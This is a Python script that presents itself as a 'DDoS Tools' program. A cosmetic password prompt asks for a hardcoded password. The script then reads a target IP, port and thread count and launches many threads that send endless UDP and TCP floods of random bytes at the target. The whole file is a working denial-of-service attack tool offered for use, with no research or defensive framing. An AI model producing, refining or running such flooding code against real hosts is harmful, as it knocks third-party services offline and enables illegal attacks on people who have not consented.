#Excrusher
#Sanzo
import random
import socket
import threading
import os
import sys
import time
from time import sleep

name = input("\033[97m[•] Name : ")
print(f"\033[97m[•] Searching Name \033[94m{name} \033[97mIn Database")
time.sleep(2)
os.system("cls")

password ="felixxx"

for i in range(3):
	pwd = input("\033[97m[•] Password : ")
	print(f"\033[97m[•] Searching Password \033[94m{pwd} \033[97mIn Database")
	j=3
	if(pwd==password):
		time.sleep(3)
		os.system("cls")
		print("\033[92m[•] Access Granted")
		break
	else:
		time.sleep(1)
		print("\033[91m[×] Wrong Password")
		continue
time.sleep(2)
print("[•] Your Account Has Been Accepted! \033[92m[√]\033[0m ")
time.sleep(1)
os.system("clear")


print("""\033[31m▓█████▄ ▓█████▄  ▒█████    ██████ 
▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒  
░██   █▌░██   █▌▒██░  ██▒░ ▓██▄    
░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒  
░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒  
 ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░  
 ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░  
 ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░   
   ░       ░        ░ ░        ░   
 ░       ░                       """) 

print("\033[97m========= ZieLx/FeLixxx DDoS Tools =========") 
print("\033[91m>> Author : FeLixxx") 
print("\033[91m>>> Coded : FeLixxx\r\n")
ip = str(input("\033[96m[+] Ip/Host : "))
port = int(input("[-] Port : "))
choice = str(input("[+] Ready?? (y/n) : "))
times = int(input("[-] Times: "))
threads = int(input("[+] Threads (28000) : "))
os.system("cls")
def ddos():
	data = random._urandom(1024)
	i = random.choice(("[-]","[•]","[+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +f"\033[92m Attacking \033[31m{ip} \033[92mPort \033[31m{port}")
		except:
			print(i +f"\033[92m Attacking \033[31m{ip} \033[92mPort \033[31m{port}")


def ddos2():
	data = random._urandom(1025)
	i = random.choice(("[-]","[•]","[+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +f"\033[92m Attacking \033[31m{ip} \033[92mPort \033[31m{port}")
		except:
			s.close()
			print(i +f"\033[92m Attacking \033[31m{ip} \033[92mPort \033[31m{port}")


def ddos3():
	data = random._urandom(1025)
	i = random.choice(("[-]","[•]","[+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +f"\033[92m Attacking \033[31m{ip} \033[92mPort \033[31m{port}")
		except:
			s.close()
			print(i +f"\033[92m Attacking \033[31m{ip} \033[92mPort \033[31m{port}")


for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = ddos)
		th.start()
		th = threading.Thread(target = ddos2)
		th.start()
	else:
	    th = threading.Thread(target = ddos3)
	    th.start()
